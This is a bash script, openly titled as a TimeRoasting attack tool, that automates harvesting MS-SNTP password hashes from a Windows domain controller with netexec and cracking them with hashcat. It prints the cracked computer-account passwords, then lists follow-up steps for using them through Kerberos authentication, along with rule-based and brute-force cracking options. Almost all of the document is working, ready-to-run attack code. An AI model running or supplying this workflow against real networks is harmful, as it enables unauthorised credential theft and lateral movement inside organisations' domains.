#!/bin/bash
# TimeRoasting Attack Automation Script
# Automates the NetExec + Hashcat workflow for MS-SNTP MAC collection and cracking

set -e

# Configuration
DC_TARGET="${1:-}"
OUTPUT_DIR="${2:-./timeroast-output}"
WORDLIST="${3:-/usr/share/wordlists/rockyou.txt}"
HASHCAT_MODE=31300

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

usage() {
    echo -e "${YELLOW}TimeRoasting Attack Automation${NC}"
    echo "Usage: $0 <dc_fqdn_or_ip> [output_dir] [wordlist]"
    echo ""
    echo "Arguments:"
    echo "  dc_fqdn_or_ip    Target Domain Controller (FQDN or IP)"
    echo "  output_dir       Output directory for results (default: ./timeroast-output)"
    echo "  wordlist         Path to wordlist for Hashcat (default: /usr/share/wordlists/rockyou.txt)"
    echo ""
    echo "Example:"
    echo "  $0 dc01.corp.local ./results /path/to/wordlist.txt"
    exit 1
}

# Check arguments
if [ -z "$DC_TARGET" ]; then
    usage
fi

# Check dependencies
echo -e "${YELLOW}Checking dependencies...${NC}"

if ! command -v netexec &> /dev/null; then
    echo -e "${RED}Error: netexec not found. Install with: pipx install netexec${NC}"
    exit 1
fi

if ! command -v hashcat &> /dev/null; then
    echo -e "${RED}Error: hashcat not found. Please install hashcat.${NC}"
    exit 1
fi

if [ ! -f "$WORDLIST" ]; then
    echo -e "${RED}Error: Wordlist not found at $WORDLIST${NC}"
    exit 1
fi

echo -e "${GREEN}Dependencies OK${NC}"

# Create output directory
mkdir -p "$OUTPUT_DIR"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
HASH_FILE="$OUTPUT_DIR/timeroast_${TIMESTAMP}.hashes"
RESULT_FILE="$OUTPUT_DIR/cracked_${TIMESTAMP}.txt"

echo -e "${YELLOW}=== TimeRoasting Attack ===${NC}"
echo "Target: $DC_TARGET"
echo "Output: $OUTPUT_DIR"
echo "Timestamp: $TIMESTAMP"
echo ""

# Step 1: Collect MS-SNTP MACs
echo -e "${YELLOW}[Step 1] Collecting MS-SNTP MACs from $DC_TARGET...${NC}"
echo "Running: netexec smb $DC_TARGET -M timeroast"
echo ""

netexec smb "$DC_TARGET" -M timeroast 2>&1 | tee "$OUTPUT_DIR/netexec_${TIMESTAMP}.log" | \
    grep -E '\$sntp-ms\$' > "$HASH_FILE" || true

HASH_COUNT=$(wc -l < "$HASH_FILE" 2>/dev/null || echo "0")

if [ "$HASH_COUNT" -eq 0 ]; then
    echo -e "${RED}No hashes collected. Check if UDP/123 is accessible from your position.${NC}"
    echo "Try: nmap -sU -p 123 $DC_TARGET"
    exit 1
fi

echo -e "${GREEN}Collected $HASH_COUNT hash(es)${NC}"
echo "Saved to: $HASH_FILE"
echo ""

# Step 2: Crack with Hashcat
echo -e "${YELLOW}[Step 2] Cracking hashes with Hashcat (mode $HASHCAT_MODE)...${NC}"
echo "Running: hashcat -m $HASHCAT_MODE $HASH_FILE $WORDLIST --username"
echo ""

# Run hashcat in the background and monitor
hashcat -m $HASHCAT_MODE "$HASH_FILE" "$WORDLIST" --username -a 0 \
    -o "$RESULT_FILE" 2>&1 &
HASHCAT_PID=$!

echo -e "${YELLOW}Hashcat running in background (PID: $HASHCAT_PID)${NC}"
echo "Press Ctrl+C to stop, or wait for completion."
echo "Monitor progress: watch 'cat $OUTPUT_DIR/cracked_*.txt'"
echo ""

# Wait for hashcat to complete
wait $HASHCAT_PID

# Step 3: Report results
echo -e "${YELLOW}[Step 3] Attack complete${NC}"
echo ""

CRACKED_COUNT=$(wc -l < "$RESULT_FILE" 2>/dev/null || echo "0")

if [ "$CRACKED_COUNT" -gt 0 ]; then
    echo -e "${GREEN}Successfully cracked $CRACKED_COUNT password(s)!${NC}"
    echo ""
    echo -e "${YELLOW}Cracked credentials:${NC}"
    cat "$RESULT_FILE"
    echo ""
    
    echo -e "${YELLOW}Next steps:${NC}"
    echo "1. Map RIDs to computer account names (e.g., RID 1125 -> IT-COMPUTER3$)"
    echo "2. Test credentials with Kerberos:"
    echo "   netexec smb $DC_TARGET -u <computer_account$> -p '<password>' -k"
    echo ""
    echo "3. Ensure time sync before Kerberos:"
    echo "   sudo ntpdate $DC_TARGET"
else
    echo -e "${RED}No passwords cracked. Try:"
    echo "- Different wordlist"
    echo "- Rule-based attacks (hashcat -a 6)"
    echo "- Brute force for short passwords (hashcat -a 3)"
fi

echo ""
echo -e "${YELLOW}Output files:${NC}"
echo "  Hashes: $HASH_FILE"
echo "  Cracked: $RESULT_FILE"
echo "  Log: $OUTPUT_DIR/netexec_${TIMESTAMP}.log"
